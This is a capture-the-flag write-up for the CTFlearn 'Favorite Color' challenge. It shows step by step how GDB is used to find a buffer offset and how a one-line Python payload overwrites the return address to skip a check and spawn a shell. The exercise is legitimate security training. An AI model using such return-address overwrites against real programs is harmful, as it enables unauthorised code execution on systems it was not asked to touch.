# [Favorite Color](https://ctflearn.com/challenge/391)

1. Check the source code. Clearly no input can make `good` true. Let's make the program skip the check.
2. GDB -> `disas main` -> instruction after the jump *je*: **0x08048657**
3. `b *vuln+34`, `run`, enter a long string of a's
4. On hitting the breakpoint:
    - `i f` -> ebp is at **0xff89d8f8**
    - `x/100xg $ebp-200` -> input buffer starts at **0xff89d8c8** = ebp-0x30 = ebp-48
    - return address is stored at ebp+4
5. Enter 52 bytes of gibberish and then desired return address (take care of endianness):

    ```shell
    (python -c "print('a'*52 + '\x57\x86\x04\x08')"; cat) | ./color
    ```

> The above spawns shell successfully, executing `cat flag.txt` should give the flag. If you encounter an error "Cannot fork", just kill all the "/bin/sh" processes: `ps aux | awk '$11 == "/bin/sh" {print $2}'`, and then run the exploit again
